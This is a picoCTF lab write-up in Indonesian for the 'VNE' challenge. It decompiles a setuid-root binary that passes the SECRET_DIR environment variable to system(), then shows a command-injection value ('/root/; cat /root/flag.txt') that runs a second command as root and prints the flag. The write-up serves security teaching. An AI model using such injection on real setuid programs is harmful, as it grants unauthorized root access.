# VNE
## Problem
We've got a binary that can list directories as root, try it out !!
## Analisis
Jika memang seperti itu, berarti aplikasi ini sudah diset untuk UID atau GID nya sebagai root, dan juga di sini environment yang kita gunakan ialah sebagai direktori input.\
Kita tidak diberi file binarynya, tetapi jika ingin mendapatkannya, kita bisa menggunakan command scp seperti di bawah ini:
```
scp -P <port> ctf-player@saturn.picoctf.net:/home/ctf-flag/ ./
```

kita bisa decompile menggunakan Cutters, dan ini hasilnya untuk bagian main:
```
uint64_t main(void)
{
    undefined8 uVar1;
    uint64_t uVar2;
    int64_t in_FS_OFFSET;
    bool bVar3;
    undefined var_75h;
    int32_t var_74h;
    char *var_70h;
    int64_t arg1;
    int64_t arg3;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    var_70h = (char *)getenv("SECRET_DIR");
    if (var_70h == (char *)0x0) {
        uVar1 = print(_ZSt4cerr, "Error: SECRET_DIR environment variable is not set");
        method.std::ostream.operator___std::ostream______std::ostream
                  (uVar1, 
                   _std::basic_ostream<char, std::char_traits<char>>& std::endl<char, std::char_traits<char>>(std::basic_ostream<char, std::char_traits<char>>&)
                  );
        uVar2 = 1;
    } else {
        uVar1 = print(_ZSt4cout, "Listing the content of ");
        uVar1 = print(uVar1, var_70h);
        uVar1 = print(uVar1, " as root: ");
        method.std::ostream.operator___std::ostream______std::ostream
                  (uVar1, 
                   _std::basic_ostream<char, std::char_traits<char>>& std::endl<char, std::char_traits<char>>(std::basic_ostream<char, std::char_traits<char>>&)
                  );
        method.std::allocator_char_.allocator(&var_75h);
        method.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char__.basic_string_char_const___std::allocator_char__const
                  (&arg3, var_70h, &var_75h);
        method.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___std.operator__char__std::char_traits_char___std::allocator_char___char_const___std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char
                  ((int64_t)&arg1, 0x206d, (int64_t)&arg3);
        method.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char__._basic_string(&arg3);
        method.std::allocator_char_._allocator(&var_75h);
        setgid(0);
        setuid(0);
        uVar1 = method.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char__.c_str___const
                          (&arg1);
        var_74h = system(uVar1);
        bVar3 = var_74h != 0;
        if (bVar3) {
            uVar1 = print                              (_ZSt4cerr, "Error: system() call returned non-zero value: ");
            uVar1 = method.std::ostream.operator___int(uVar1, var_74h);
            method.std::ostream.operator___std::ostream______std::ostream
                      (uVar1, 
                       _std::basic_ostream<char, std::char_traits<char>>& std::endl<char, std::char_traits<char>>(std::basic_ostream<char, std::char_traits<char>>&)
                      );
        }
        uVar2 = (uint64_t)bVar3;
        method.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char__._basic_string(&arg1);
    }
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar2 = __stack_chk_fail();
    }
    return uVar2;
}


```
Terlihat menggunakan fungsi system(), kita bisa mengasumsikan bahwa ini hanyalah wrapper 'ls -la ' dan environment SECRET_DIR adalah string selanjutnya. Jika memang seperti itu, kita bisa membuat system mengeksekusi 2 perintah dengan previllage root dengan cara membuat isi dari SECRET_DIR ialah 
```
'/root/; cat /root/flag.txt'
```

## Hasil
```
baba@fedora:~$ ssh ctf-player@saturn.picoctf.net -p 53572
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.17.0-1019-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@pico-chall$ ls
bin
ctf-player@pico-chall$ ./bin 
Error: SECRET_DIR environment variable is not set
ctf-player@pico-chall$ SECRET_DIR='/root/; cat /root/flag.txt'
ctf-player@pico-chall$ SECRET_DIR='/root/; cat /root/flag.txt' ./bin
Listing the content of /root/; cat /root/flag.txt as root: 
flag.txt
picoCTF{Power_t0_man!pul4t3_3nv_d0cc7fe2}ctf-player@pico-chall$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.

```